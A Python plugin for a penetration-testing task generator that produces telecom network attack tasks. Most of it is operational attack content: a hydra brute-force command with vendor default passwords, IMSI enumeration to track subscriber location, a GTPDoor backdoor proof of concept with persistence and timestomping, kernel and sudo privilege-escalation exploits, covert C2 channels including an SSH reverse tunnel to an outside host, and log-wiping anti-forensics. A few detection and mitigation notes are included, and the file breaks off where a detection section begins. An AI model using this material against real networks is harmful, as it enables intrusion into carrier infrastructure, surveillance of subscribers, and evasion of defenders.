"""
Telecommunications Network Exploitation service plugin

Generates tasks for telecom infrastructure attacks including:
- SS7 protocol exploitation (IMSI tracking, SMS interception)
- GTP (GPRS Tunneling Protocol) enumeration and attacks
- 5G NAS (Non-Access Stratum) protocol attacks
- SGSN/GGSN/PGW infrastructure reconnaissance
- Diameter protocol attacks (LTE/4G)
- Telecom vendor default credentials
- Covert channels (GTP, ICMP, DNS)
- Network element privilege escalation

OSCP RELEVANCE: LOW - Highly specialized telecom/carrier infrastructure
(More relevant for: Red team telecom, OT/SCADA, nation-state operations)

NOTE: SIP/VoIP attacks covered in separate voip.py plugin (OSCP:MEDIUM)

Extracted from HackTricks: pentesting-network/telecom-network-exploitation.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class TelecomExploitPlugin(ServicePlugin):
    """Telecommunications network exploitation plugin"""

    @property
    def name(self) -> str:
        return "telecom-exploit"

    @property
    def default_ports(self) -> List[int]:
        # GTP-C, GTP-U, Diameter, SS7/SIGTRAN
        return [2123, 2152, 3868, 2905, 8530]

    @property
    def service_names(self) -> List[str]:
        return ['gtp', 'gtp-c', 'gtp-u', 'diameter', 'sctp', 'sigtran', 'ss7']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """
        Detect telecommunications infrastructure services

        Triggers when:
        - GTP-C (UDP 2123) or GTP-U (UDP 2152) detected
        - Diameter (TCP 3868) detected
        - SCTP/SIGTRAN (2905) detected
        - Telecom vendor products identified
        """
        service = port_info.get('service', '').lower()
        port = port_info.get('port')
        product = port_info.get('product', '').lower()

        # Check telecom-specific service names
        if any(svc in service for svc in self.service_names):
            return True

        # Check telecom signaling ports
        if port in self.default_ports:
            return True

        # Check for telecom vendor products
        telecom_vendors = ['ericsson', 'nokia', 'huawei', 'zte', 'osmo', 'sgsn', 'ggsn', 'mme', 'pgw']
        if any(vendor in product for vendor in telecom_vendors):
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate telecommunications exploitation task tree"""
        service = service_info.get('service', '').lower()
        product = service_info.get('product', 'Telecom Infrastructure')
        version = service_info.get('version', 'unknown')

        tasks = {
            'id': f'telecom-exploit-{port}',
            'name': f'Telecom Network Exploitation ({product})',
            'type': 'parent',
            'children': []
        }

        # ========== PHASE 1: RECONNAISSANCE ==========
        recon_tasks = {
            'id': f'telecom-recon-{port}',
            'name': 'Telecom Infrastructure Reconnaissance',
            'type': 'parent',
            'children': []
        }

        # Task 1: Default vendor credentials
        recon_tasks['children'].append({
            'id': f'telecom-defaults-{port}',
            'name': 'Test Telecom Vendor Default Credentials',
            'type': 'command',
            'metadata': {
                'command': f'hydra -L /usr/share/wordlists/telecom-defaults-users.txt -P /usr/share/wordlists/telecom-defaults-pass.txt ssh://{target} -t 8',
                'description': 'Brute-force SSH with telecom vendor default credentials',
                'tags': ['OSCP:LOW', 'QUICK_WIN', 'TELECOM'],
                'flag_explanations': {
                    '-L': 'Username wordlist (telecom vendor defaults)',
                    '-P': 'Password wordlist (vendor-specific passwords)',
                    '-t 8': 'Parallel connections (conservative for infrastructure)'
                },
                'success_indicators': [
                    'Valid credentials found',
                    'SSH login successful',
                    'Access to network element'
                ],
                'failure_indicators': [
                    'All attempts failed',
                    'Account lockout triggered',
                    'Credentials changed from defaults'
                ],
                'next_steps': [
                    'Document compromised credentials',
                    'Enumerate network element type (SGSN/GGSN/MME/PGW)',
                    'Check for privilege escalation paths',
                    'Map connected infrastructure'
                ],
                'alternatives': [
                    'Manual SSH: ssh root@{target} (password: admin)',
                    'Manual SSH: ssh dbadmin@{target} (password: dbadmin)',
                    'Telnet: telnet {target} (if SSH disabled)',
                    'Web interface: http://{target}:8080 or :443'
                ],
                'notes': '''COMMON TELECOM DEFAULTS:
Ericsson: root/admin, dbadmin/dbadmin, expert/expert
Nokia: admin/admin, nokia/nokia
Huawei: admin/admin, root/admin123
OsmoGGSN: root/root, admin/osmocom
Cacti: cacti/cacti (monitoring)
Generic: ftpuser/ftpuser, netop/netop, support/support

Create custom wordlists:
echo -e "root\\ndbadmin\\nadmin\\nexpert\\ncacti\\nftpuser\\nnetop\\nsupport" > telecom-defaults-users.txt
echo -e "admin\\ndbadmin\\nadmin123\\nexpert\\nosmocom\\ncacti\\npassword" > telecom-defaults-pass.txt'''
            }
        })

        # Task 2: GRX/IPX host discovery
        recon_tasks['children'].append({
            'id': f'grx-discovery-{port}',
            'name': 'GRX/IPX Network Discovery',
            'type': 'command',
            'metadata': {
                'command': f'sudo masscan 10.0.0.0/8 -pU:2123 --rate 50000 --router-ip 10.0.0.254 --router-mac 00:11:22:33:44:55 -oL gtp-c-listeners.txt',
                'description': 'Scan GRX/IPX backbone for GTP-C listeners (SGSN/GGSN discovery)',
                'tags': ['OSCP:LOW', 'RECON', 'TELECOM', 'NOISY'],
                'flag_explanations': {
                    '-pU:2123': 'UDP port 2123 (GTP-C control plane)',
                    '--rate 50000': 'High-speed scan (50K packets/sec)',
                    '--router-ip': 'Gateway IP for routing (adjust to network)',
                    '--router-mac': 'Gateway MAC address (adjust to network)',
                    '-oL': 'Output in list format'
                },
                'success_indicators': [
                    'GTP-C listeners discovered',
                    'SGSN/GGSN IP addresses identified',
                    'Responsive telecom infrastructure found'
                ],
                'failure_indicators': [
                    'No responses (wrong network segment)',
                    'Not on GRX/IPX backbone',
                    'Firewall blocking UDP 2123'
                ],
                'next_steps': [
                    'Parse results: grep open gtp-c-listeners.txt | awk \'{print $4}\'',
                    'Enumerate discovered GTP nodes with cordscan',
                    'Test GTP-C with echo requests',
                    'Map network topology'
                ],
                'alternatives': [
                    'nmap (slower): nmap -sU -p 2123 10.0.0.0/8 --max-retries 0',
                    'zmap: zmap -p 2123 10.0.0.0/8 -M udp -o gtp-c.txt',
                    'Manual ICMP sweep: masscan 10.0.0.0/8 -p0 --ping (if ICMP allowed)'
                ],
                'notes': 'GRX (GPRS Roaming eXchange) is semi-trusted roaming backbone. GTP-C (2123) = control plane, GTP-U (2152) = user plane. Most GRX operators still allow ICMP. Requires network positioning inside telecom infrastructure.'
            }
        })

        # Task 3: Network element fingerprinting
        recon_tasks['children'].append({
            'id': f'ne-fingerprint-{port}',
            'name': 'Network Element Fingerprinting',
            'type': 'command',
            'metadata': {
                'command': f'nmap -sV -sC -p22,23,80,443,161,2123,2152,3868 {target} -oA ne-fingerprint',
                'description': 'Fingerprint telecom network element type and services',
                'tags': ['OSCP:LOW', 'RECON', 'ENUM'],
                'flag_explanations': {
                    '-sV': 'Service version detection (identify NE type)',
                    '-sC': 'Default scripts (may reveal SNMP, HTTP info)',
                    '-p22,23,80,443,161,2123,2152,3868': 'Telecom management and signaling ports',
                    '-oA': 'Output all formats for analysis'
                },
                'success_indicators': [
                    'Service versions identified',
                    'NE type revealed (SGSN/GGSN/MME/PGW)',
                    'Vendor product detected',
                    'SNMP community strings found'
                ],
                'failure_indicators': [
                    'All ports filtered',
                    'No version information',
                    'Firewall blocking scan'
                ],
                'next_steps': [
                    'Research identified vendor/product for CVEs',
                    'Test SNMP if port 161 open: snmpwalk -v2c -c public {target}',
                    'Enumerate web interface if HTTP open',
                    'Test default credentials for identified product'
                ],
                'alternatives': [
                    'Banner grabbing: nc {target} 22; nc {target} 23',
                    'HTTP enum: curl -k https://{target}/about or /login',
                    'SNMP enum: onesixtyone -c community.txt {target}',
                    'Manual identification from network topology'
                ],
                'notes': 'Network Element (NE) types: SGSN (2G/3G), GGSN (2G/3G), MME (4G/LTE), PGW (4G packet gateway), SGW (serving gateway). Ports: 2123=GTP-C, 2152=GTP-U, 3868=Diameter, 161=SNMP.'
            }
        })

        tasks['children'].append(recon_tasks)

        # ========== PHASE 2: GTP EXPLOITATION ==========
        gtp_tasks = {
            'id': f'gtp-exploit-{port}',
            'name': 'GTP (GPRS Tunneling Protocol) Attacks',
            'type': 'parent',
            'children': []
        }

        # Task 4: IMSI enumeration (cordscan)
        gtp_tasks['children'].append({
            'id': f'cordscan-imsi-{port}',
            'name': 'IMSI Subscriber Enumeration (cordscan)',
            'type': 'command',
            'metadata': {
                'command': f'./cordscan --imsi 404995112345678 --oper 40499 -w imsi-scan.pcap',
                'description': 'Craft GTP-C Create PDP Context to enumerate subscribers (IMSI tracking)',
                'tags': ['OSCP:LOW', 'ENUM', 'TELECOM', 'PRIVACY'],
                'flag_explanations': {
                    '--imsi': 'Target subscriber IMSI (15 digits: MCC+MNC+MSIN)',
                    '--oper': 'Home Network Identifier (HNI = MCC+MNC)',
                    '-w': 'Write packets to pcap for analysis',
                    'cordscan': 'Custom Go tool for GTP-C enumeration'
                },
                'success_indicators': [
                    'GTP-C response received',
                    'SGSN/MME serving subscriber revealed',
                    'Visited PLMN identified',
                    'Subscriber location data obtained'
                ],
                'failure_indicators': [
                    'No response (IMSI not active or invalid)',
                    'GTP-C blocked by firewall',
                    'Invalid HNI or IMSI format'
                ],
                'next_steps': [
                    'Parse pcap: wireshark imsi-scan.pcap',
                    'Extract SGSN IP from response',
                    'Enumerate range of IMSIs (MSIN increment)',
                    'Map subscriber locations via PLMN',
                    'Correlate with SMS interception targets'
                ],
                'alternatives': [
                    'Manual GTP-C crafting: Scapy GTP module',
                    'gtp-scan: Commercial telecom testing tools',
                    'Passive monitoring: Capture legitimate GTP-C traffic'
                ],
                'notes': '''IMSI FORMAT: MCC (3 digits) + MNC (2-3 digits) + MSIN (9-10 digits)
Example: 404-99-5112345678 (India - Bharti Airtel)

BUILD CORDSCAN:
GOOS=linux GOARCH=amd64 go build -o cordscan ./cmd/cordscan

KEY CONSTANTS (editable in binary):
pingtimeout = 3        # seconds before giving up
pco = 0x218080         # Protocol Config Options
common_tcp_ports = "22,23,80,443,8080"

PRIVACY IMPACT: Reveals subscriber location and serving network. Illegal without authorization.'''
            }
        })

        # Task 5: GTPDoor backdoor
        gtp_tasks['children'].append({
            'id': f'gtpdoor-backdoor-{port}',
            'name': 'GTPDoor: Covert C2 over GTP-C',
            'type': 'manual',
            'metadata': {
                'description': 'Deploy GTPDoor backdoor for command execution via GTP Echo packets',
                'tags': ['OSCP:LOW', 'EXPLOIT', 'BACKDOOR', 'COVERT'],
                'notes': '''GTPDOOR: GTP-C based backdoor (UDP 2123)

ARCHITECTURE:
- Binds UDP 2123 (GTP-C port)
- Parses incoming GTP-C packets
- Magic tag triggers decryption and execution
- Exfiltrates via Echo Response (no outbound connections)

PYTHON POC (send commands):
```python
import gtpc, Crypto.Cipher.AES as AES

key = b"SixteenByteKey!"  # Pre-shared AES key
cmd = b"id;uname -a"      # Command to execute

# Encrypt command
enc = AES.new(key, AES.MODE_CBC, iv=b"\\x00"*16).encrypt(cmd.ljust(32, b"\\x00"))

# Build GTP-C Echo Request with encrypted command
packet = gtpc.build_echo_req(tag=b"MAG1C", blob=enc)

# Send to backdoor
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(packet, (target, 2123))
response = sock.recv(4096)  # stdout/stderr in Echo Response
print(response)
```

DEPLOYMENT:
1. Compile GTPDoor ELF:
   gcc -o gtpdoor gtpdoor.c -lcrypto

2. Upload to compromised SGSN/GGSN:
   scp gtpdoor root@{target}:/tmp/

3. Execute with persistence:
   nohup /tmp/gtpdoor &
   echo "/tmp/gtpdoor" >> /etc/rc.local

4. Timestomp binary:
   touch -r /usr/bin/time /tmp/gtpdoor

DETECTION SIGNATURES:
- Unbalanced Echo Requests to SGSN IPs (no matching Responses)
- GTP version flag = 1 with message type = 1 (Echo) - deviation from spec
- High-frequency Echo traffic from single source

OPSEC CONSIDERATIONS:
- Blends with legitimate GTP-C chatter
- No outbound connections (exfiltration via Echo Response)
- Passive listener (no beacon)
- AES-128-CBC encryption
- Requires pre-positioning key

OSCP RELEVANCE: LOW - Highly specialized, requires GTP network access''',
                'alternatives': [
                    'ICMP backdoor: EchoBackdoor (4-byte key + XOR encoding)',
                    'DNS backdoor: NoDepDNS (XOR key "funnyAndHappy" in A-records)',
                    'Traditional reverse shell over allowed ports (53, 80, 443)'
                ]
            }
        })

        # Task 6: sgsnemu tunnel
        gtp_tasks['children'].append({
            'id': f'sgsnemu-tunnel-{port}',
            'name': 'sgsnemu: Data Plane Tunnel via GTP',
            'type': 'command',
            'metadata': {
                'command': f'sgsnemu -g {target} -i 10.1.1.10 -m 40499 -s 404995112345678 --apn internet -c 1 -d',
                'description': 'Establish PDP context to GGSN/PGW for data plane access (tunnel)',
                'tags': ['OSCP:LOW', 'EXPLOIT', 'PIVOTING', 'TUNNEL'],
                'flag_explanations': {
                    '-g': 'GGSN/PGW IP address (target gateway)',
                    '-i': 'Local IP for signaling',
                    '-m': 'Mobile Country Code + Mobile Network Code (MCC+MNC)',
                    '-s': 'IMSI (International Mobile Subscriber Identity)',
                    '--apn': 'Access Point Name (internet/default/etc)',
                    '-c 1': 'Number of contexts to create',
                    '-d': 'Detach mode (manual control)'
                },
                'success_indicators': [
                    'PDP context established',
                    'tun0 interface created',
                    'IP assigned from GGSN/PGW',
                    'Ping to remote network successful'
                ],
                'failure_indicators': [
                    'GTP-C negotiation failed',
                    'Invalid IMSI or APN',
                    'GGSN/PGW unreachable',
                    'Authentication required'
                ],
                'next_steps': [
                    'Add routes via tunnel: sudo ip route add 172.16.0.0/12 dev tun0',
                    'Set up SOCKS proxy: microsocks -p 1080 &',
                    'Configure firewall NAT: iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE',
                    'Enable IP forwarding: sysctl -w net.ipv4.ip_forward=1',
                    'Access internal data plane resources',
                    'Bypass signalling-only VLAN restrictions'
                ],
                'alternatives': [
                    'Manual GTP-U tunnel: ip tunnel add gtp0 mode gtp local {local_ip} remote {target}',
                    'OpenGGSN: Configure full GGSN emulator',
                    'Commercial tools: Spirent, Landslide for GTP testing'
                ],
                'notes': '''SGSNEMU (OsmoGGSN package): SGSN emulator for GTP testing

WORKFLOW:
1. sgsnemu establishes GTP-C with GGSN
2. Creates PDP (Packet Data Protocol) context
3. Negotiates IP address from GGSN pool
4. Linux tun0 interface receives traffic
5. Data plane now accessible (bypasses signaling VLANs)

HAIR-PINNING:
With proper firewall rules, tunnel bypasses network segmentation:
iptables -A FORWARD -i tun0 -o eth0 -j ACCEPT
iptables -A FORWARD -i eth0 -o tun0 -m state --state RELATED,ESTABLISHED -j ACCEPT

OSCP RELEVANCE: LOW - Telecom-specific pivoting technique'''
            }
        })

        tasks['children'].append(gtp_tasks)

        # ========== PHASE 3: 5G NAS ATTACKS ==========
        nas_5g_tasks = {
            'id': f'5g-nas-{port}',
            'name': '5G NAS (Non-Access Stratum) Protocol Attacks',
            'type': 'parent',
            'children': []
        }

        # Task 7: SUCI privacy leak
        nas_5g_tasks['children'].append({
            'id': f'5g-suci-leak-{port}',
            'name': '5G SUCI Privacy Leak Detection',
            'type': 'manual',
            'metadata': {
                'description': 'Detect 5G NAS Registration exposing plaintext SUPI/IMSI instead of encrypted SUCI',
                'tags': ['OSCP:LOW', 'PRIVACY', '5G', 'ANALYSIS'],
                'notes': '''5G IDENTIFIER PRIVACY:

EXPECTED BEHAVIOR:
- UE/USIM transmits SUCI (SUPI encrypted with home-network public key)
- Prevents persistent subscriber tracking
- Mandatory in 5G standalone (SA) mode

VULNERABILITY:
- Registration Request contains plaintext SUPI/IMSI
- Privacy defect enabling subscriber tracking

WIRESHARK ANALYSIS:
1. Capture N2 (NGAP) traffic between gNB and AMF
2. Filter: ngap.procedure_code == 15 (InitialUEMessage)
3. Expand: InitialUEMessage → NAS-PDU → Registration Request
4. Check Mobile Identity IE:
   - SHOULD decode as: SUCI (nas-5gs.mobile_identity.suci)
   - SHOULD NOT show: IMSI (nas_5g.mobile_identity.imsi)

DISPLAY FILTERS:
ngap.procedure_code == 15
nas_5g.message_type == 65 or nas-5gs.message_type == 65

TEST LAB SETUP (non-RF):
- Core: Open5GS (default deployment sufficient)
- UE: UERANSIM simulator or test UE
- Tools: Wireshark with NGAP/NAS dissectors
- Capture: tcpdump -i any -w 5g-registration.pcap 'sctp or port 38412'

WHAT TO COLLECT:
- MCC/MNC/MSIN if exposed (plaintext IMSI)
- Log per-UE and track across time/locations
- SUPI leakage = tracking vector

MITIGATION:
- Enforce SUCI-only UEs/USIMs
- Alert on any IMSI/SUPI in initial NAS messages
- Reject UEs sending plaintext identifiers

OSCP RELEVANCE: LOW - 5G core testing, specialized equipment required''',
                'alternatives': [
                    '5GReplay: Capture and replay NAS messages',
                    'Sni5Gect: Sniff/patch/inject NAS on-the-fly',
                    'Passive monitoring: Wireshark on N2 interface'
                ]
            }
        })

        # Task 8: Null algorithm downgrade (EEA0/EIA0)
        nas_5g_tasks['children'].append({
            'id': f'5g-null-algo-{port}',
            'name': '5G NAS Null Algorithm Downgrade (EEA0/EIA0)',
            'type': 'manual',
            'metadata': {
                'description': 'Force 5G NAS security to null encryption/integrity algorithms',
                'tags': ['OSCP:LOW', 'EXPLOIT', '5G', 'MITM'],
                'notes': '''5G NAS NULL ALGORITHM DOWNGRADE:

BACKGROUND:
- UE advertises supported algorithms in Registration Request
- EEA = Encryption, EIA = Integrity
- EEA1/EIA1 = SNOW3G, EEA2/EIA2 = AES, EEA3/EIA3 = ZUC
- EEA0/EIA0 = NULL algorithms (no protection)

VULNERABILITY:
- Registration Request NOT integrity protected (pre-security phase)
- On-path attacker can modify UE Security Capability IE
- Clear all algorithm bits except EEA0/EIA0
- AMF may accept null algorithms outside emergency services

EXPLOITATION (using Sni5Gect):
1. Position on N2 interface (gNB ↔ AMF)
2. Intercept InitialUEMessage containing Registration Request
3. Hook NAS message and patch UE Security Capability bits:
   - Clear EEA1, EEA2, EEA3 → leave only EEA0
   - Clear EIA1, EIA2, EIA3 → leave only EIA0
4. Forward modified message to AMF
5. Observe Security Mode Command/Complete

WIRESHARK VERIFICATION:
Filter: nas_5g.security_mode_command or nas_5g.security_mode_complete
Check selected algorithms:
- If EEA0 selected: "Encryption in use [EEA0]"
- If EIA0 selected: "Integrity in use [EIA0]"

EXAMPLE OUTPUT (successful downgrade):
```
Encryption in use [EEA0]
Integrity in use [EIA0, EIA1, EIA2]  # Some stacks allow mixed
SUPI (MCC+MNC+MSIN) 9997000000001
```

PASSIVE DETECTION:
Look for Security Mode Command with NAS ciphering = EEA0:
nas_5g.nas_sec_algo.eps_encryption == 0

MITIGATION (AMF/POLICY):
- Reject EEA0/EIA0 except emergency calls
- Enforce minimum EEA2/EIA2 (AES)
- Log and alarm on null algorithm negotiation
- Implement integrity protection for Registration Request

TOOLS:
- 5GReplay: Capture/modify/replay NGAP+NAS
- Sni5Gect: Live NAS patching without full rogue gNB
- Open5GS: Test core for policy enforcement

OSCP RELEVANCE: LOW - Requires 5G core access and specialized tools''',
                'alternatives': [
                    '5GReplay rule: Forward InitialUEMessage with modified capability bits',
                    'Passive analysis: Wireshark filtering for null algorithms',
                    'Active testing: Open5GS test UE with modified capabilities'
                ]
            }
        })

        # Task 9: NAS replay attack
        nas_5g_tasks['children'].append({
            'id': f'5g-nas-replay-{port}',
            'name': '5G NAS Registration Request Replay',
            'type': 'manual',
            'metadata': {
                'description': 'Replay captured InitialUEMessage + Registration Request (no integrity protection)',
                'tags': ['OSCP:LOW', 'EXPLOIT', '5G', 'REPLAY'],
                'notes': '''5G NAS REPLAY ATTACK:

VULNERABILITY:
- Initial NAS messages lack integrity protection
- No freshness/nonce validation
- AMF may accept replayed Registration Request

5GREPLAY POC RULE:
```xml
<beginning>
  <property value="THEN"
            property_id="101"
            type_property="FORWARD"
            description="Forward InitialUEMessage with Registration Request">

    <!-- Trigger on NGAP InitialUEMessage (procedureCode == 15) -->
    <event value="COMPUTE"
           event_id="1"
           description="Trigger: InitialUEMessage"
           boolean_expression="ngap.procedure_code == 15"/>

    <!-- Context match on NAS Registration Request (message_type == 65) -->
    <event value="COMPUTE"
           event_id="2"
           description="Context: Registration Request"
           boolean_expression="nas_5g.message_type == 65"/>

  </property>
</beginning>
```

WORKFLOW:
1. Capture legitimate InitialUEMessage during Registration
   tcpdump -i any -w capture.pcap 'sctp or port 38412'

2. Load capture in 5GReplay

3. Apply forward rule (see XML above)

4. Replay to AMF at different time or from different gNB

5. Observe if AMF proceeds to Authentication

WHAT TO OBSERVE:
- AMF accepts replay → proceeds to Authentication
- Lack of freshness validation
- No context binding (new replay appears legitimate)

DETECTION:
- Identical InitialUEMessage from same/different endpoints
- Repeated RAN-UE-NGAP-ID or AMF-UE-NGAP-ID
- High frequency of Registration Requests from single UE

MITIGATION:
- Enforce replay protection at AMF
- Context binding (gNB identity + timestamp)
- Rate limiting per UE/gNB
- Alert on duplicate Registration Requests

TOOLS:
- 5GReplay: NGAP/NAS capture/replay tool
- Wireshark: Verify procedureCode and message_type
- Open5GS: Test AMF replay protection

OSCP RELEVANCE: LOW - 5G core testing, requires N2 interface access''',
                'alternatives': [
                    'Passive monitoring: Detect replays in production traffic',
                    'tcpreplay: Raw packet replay (less protocol-aware)',
                    'Scapy NGAP: Manual packet crafting'
                ]
            }
        })

        tasks['children'].append(nas_5g_tasks)

        # ========== PHASE 4: PRIVILEGE ESCALATION ==========
        privesc_tasks = {
            'id': f'telecom-privesc-{port}',
            'name': 'Network Element Privilege Escalation',
            'type': 'parent',
            'children': []
        }

        # Task 10: Legacy CVEs (DirtyCow, PwnKit, Sudo Baron Samedit)
        privesc_tasks['children'].append({
            'id': f'legacy-privesc-{port}',
            'name': 'Legacy Kernel/Sudo Exploits',
            'type': 'command',
            'metadata': {
                'command': '# Test for common kernel/sudo vulnerabilities\nuname -a  # Check kernel version\nsudo -V  # Check sudo version',
                'description': 'Test for DirtyCow (CVE-2016-5195), PwnKit (CVE-2021-4034), Baron Samedit (CVE-2021-3156)',
                'tags': ['OSCP:MEDIUM', 'PRIVESC', 'LINUX'],
                'flag_explanations': {
                    'uname -a': 'Display kernel version (check for DirtyCow vulnerability)',
                    'sudo -V': 'Display sudo version (check for PwnKit/Baron Samedit)'
                },
                'success_indicators': [
                    'Kernel < 4.8.3 (DirtyCow vulnerable)',
                    'Polkit < 0.105-26 (PwnKit vulnerable)',
                    'Sudo < 1.9.5p2 (Baron Samedit vulnerable)'
                ],
                'failure_indicators': [
                    'Fully patched system',
                    'Recent kernel/sudo versions',
                    'SELinux blocking exploits'
                ],
                'next_steps': [
                    'DirtyCow: gcc -pthread dirty.c -o dirty && ./dirty /etc/passwd',
                    'PwnKit: python3 PwnKit.py',
                    'Baron Samedit: python3 exploit_userspec.py',
                    'Clean-up: userdel firefart 2>/dev/null; rm -f /tmp/sh; history -c'
                ],
                'alternatives': [
                    'Linux Exploit Suggester: ./linux-exploit-suggester.sh',
                    'LinPEAS: ./linpeas.sh (comprehensive enumeration)',
                    'Manual enumeration: find / -perm -4000 -type f 2>/dev/null'
                ],
                'notes': '''TELECOM NE SYSTEMS OFTEN OUTDATED:

DirtyCow (CVE-2016-5195):
- Linux kernel < 4.8.3 (2.6.22 - 4.8.3)
- Write-what-where race condition
- Modify /etc/passwd for root access

PwnKit (CVE-2021-4034):
- Polkit pkexec local privilege escalation
- Memory corruption in argument handling
- Creates root shell

Sudo Baron Samedit (CVE-2021-3156):
- Sudo < 1.9.5p2 (1.8.2 - 1.9.5p1)
- Heap overflow in sudoedit

TELECOM SYSTEMS:
- Often run legacy kernels for stability
- Vendor patches delayed
- High uptime (no reboots for patching)

POST-EXPLOITATION:
- Dump credentials: cat /etc/shadow
- Install backdoor: Add SSH key to /root/.ssh/authorized_keys
- Persistence: Add cron job or systemd service'''
            }
        })

        tasks['children'].append(privesc_tasks)

        # ========== PHASE 5: COVERT CHANNELS ==========
        covert_tasks = {
            'id': f'covert-channels-{port}',
            'name': 'Covert Channel Backdoors',
            'type': 'parent',
            'children': []
        }

        # Task 11: Covert channel summary
        covert_tasks['children'].append({
            'id': f'covert-summary-{port}',
            'name': 'Covert Channel Options',
            'type': 'manual',
            'metadata': {
                'description': 'Deploy covert channels for C2 in telecom infrastructure',
                'tags': ['OSCP:LOW', 'BACKDOOR', 'COVERT', 'TELECOM'],
                'notes': '''COVERT CHANNEL OPTIONS FOR TELECOM INFRASTRUCTURE:

╔══════════════╦═══════════╦════════════════╦═══════════════════════════════════╗
║ CHANNEL      ║ TRANSPORT ║ DECODING       ║ NOTES                             ║
╠══════════════╬═══════════╬════════════════╬═══════════════════════════════════╣
║ ICMP         ║ ICMP Echo ║ 4-byte key +   ║ Pure passive listener, no         ║
║ EchoBackdoor ║ Req/Rep   ║ 14-byte chunks ║ outbound traffic. Most basic.     ║
║              ║           ║ (XOR)          ║                                   ║
╠══════════════╬═══════════╬════════════════╬═══════════════════════════════════╣
║ DNS          ║ UDP 53    ║ XOR key =      ║ Watches for *.nodep sub-domain.   ║
║ NoDepDNS     ║           ║ "funnyAndHappy"║ Encoded in A-record octets.       ║
║              ║           ║ A-record octets║ DNS usually unrestricted.         ║
╠══════════════╬═══════════╬════════════════╬═══════════════════════════════════╣
║ GTP          ║ UDP 2123  ║ AES-128-CBC    ║ Blends with legitimate GTP-C      ║
║ GTPDoor      ║ (GTP-C)   ║ blob in private║ chatter. Best for telecom.        ║
║              ║           ║ IE             ║ Exfil via Echo Response.          ║
╠══════════════╬═══════════╬════════════════╬═══════════════════════════════════╣
║ SSH Reverse  ║ TCP 53    ║ SSH tunnel     ║ Expose internal SSH via external  ║
║ Tunnel       ║ (DNS)     ║ over DNS port  ║ VPS port 53. Return later.        ║
╚══════════════╩═══════════╩════════════════╩═══════════════════════════════════╝

ALL IMPLANTS IMPLEMENT:
- Watchdog processes (auto-restart on crash)
- Timestomping (touch -r /usr/bin/time <backdoor>)
- Process hiding (echo 0 > /proc/$$/autogroup)

ICMP EchoBackdoor:
- Simplest to deploy
- No special port requirements
- Detection: Large ICMP payloads with non-zero ID/seq fields

DNS NoDepDNS:
- Most reliable (DNS rarely blocked)
- Subdomain: *.nodep
- Detection: High-frequency DNS queries to unusual domains

GTP GTPDoor (RECOMMENDED FOR TELECOM):
- Best OPSEC in GTP environments
- Blends with legitimate traffic
- Detection: Unbalanced Echo Requests, GTP version anomalies

SSH REVERSE TUNNEL (over port 53):
- Persistent access via external VPS
- Command: ssh -f -N -R 0.0.0.0:53:127.0.0.1:22 user@vps.example.com
- Requirement: VPS config "GatewayPorts yes"

SELECTION CRITERIA:
- GTP environment → GTPDoor
- High ICMP traffic → EchoBackdoor
- DNS unrestricted → NoDepDNS
- Need persistence → SSH reverse tunnel

OSCP RELEVANCE: LOW - Specialized C2 techniques for telecom/OT environments''',
                'alternatives': [
                    'Traditional reverse shells: nc, bash /dev/tcp, python',
                    'C2 frameworks: Metasploit, Cobalt Strike, Sliver (if allowed)',
                    'SSH tunneling: ssh -R 4444:localhost:22 user@attacker'
                ]
            }
        })

        tasks['children'].append(covert_tasks)

        # ========== PHASE 6: DEFENSE EVASION ==========
        evasion_tasks = {
            'id': f'defense-evasion-{port}',
            'name': 'Defense Evasion Techniques',
            'type': 'parent',
            'children': []
        }

        # Task 12: Log cleaning and anti-forensics
        evasion_tasks['children'].append({
            'id': f'log-cleaning-{port}',
            'name': 'Log Cleaning and Anti-Forensics',
            'type': 'manual',
            'metadata': {
                'description': 'Clean logs and hide artifacts on compromised telecom network elements',
                'tags': ['OSCP:LOW', 'EVASION', 'ANTI_FORENSICS'],
                'notes': '''DEFENSE EVASION FOR TELECOM INFRASTRUCTURE:

LOG CLEANING:
# Remove attacker IPs from wtmp (login records)
utmpdump /var/log/wtmp | sed '/203\\.0\\.113\\.66/d' | utmpdump -r > /tmp/clean && mv /tmp/clean /var/log/wtmp

# Disable bash history
export HISTFILE=/dev/null
unset HISTFILE

# Clear existing history
history -c
cat /dev/null > ~/.bash_history

PROCESS HIDING:
# Masquerade as kernel thread (hide from top/htop)
echo 0 > /proc/$$/autogroup
printf '\\0' > /proc/$$/comm  # Appears as [kworker/1]

# Alternative: Rename process
exec -a [kworker/0:1] /path/to/backdoor

TIMESTOMPING:
# Match binary timestamps to legitimate system file
touch -r /usr/bin/time /usr/bin/malicious_binary
touch -r /usr/sbin/sshd /tmp/backdoor

# Preserve atime, mtime, ctime
touch -a -m -t 202301011200 /path/to/file

SELINUX BYPASS:
# Disable SELinux (if permitted)
setenforce 0

# Or modify context:
chcon -t bin_t /path/to/backdoor

FILE HIDING:
# Hide in /dev/shm (tmpfs, cleared on reboot)
cp backdoor /dev/shm/.hidden

# Append to legitimate files
cat backdoor >> /usr/lib/systemd/systemd-journald

# Hide in /proc (less scrutinized)
mkdir /proc/sys/net/.hidden

NETWORK ARTIFACT CLEANING:
# Clear arp cache
ip neigh flush all

# Clear connection tracking
conntrack -F

# Disable logging (temporary)
service rsyslog stop

POST-EXPLOITATION CLEANUP:
# Remove installation artifacts
rm -f /tmp/*.py /tmp/*.sh /tmp/*.elf

# Clear specific log entries
sed -i '/attacker.com/d' /var/log/syslog
sed -i '/suspicious_command/d' /var/log/auth.log

# Restore SELinux
setenforce 1

# Clear command history one final time
cat /dev/null > ~/.bash_history && history -c && exit

OSCP RELEVANCE: LOW - Advanced evasion, more red team than OSCP exam

ETHICAL WARNING: Only perform on authorized targets. Log cleaning may violate legal/contractual agreements.''',
                'alternatives': [
                    'Rootkits: Hide at kernel level (e.g., Diamorphine)',
                    'Live memory patching: Modify running processes',
                    'Encrypted containers: Store tools in LUKS volumes'
                ]
            }
        })

        tasks['children'].append(evasion_tasks)

        # ========== PHASE 7: DETECTION IDEAS ==========
        detection_tasks = {
            'id': f'detection-ideas-{port}',
            'name': 'Defensive Detection Strategies',
            'type': 'parent',
            'children': []
        }

        # Task 13: Detection methods (for defenders)
        detection_tasks['children'].append({
            'id': f'detection-methods-{port}',
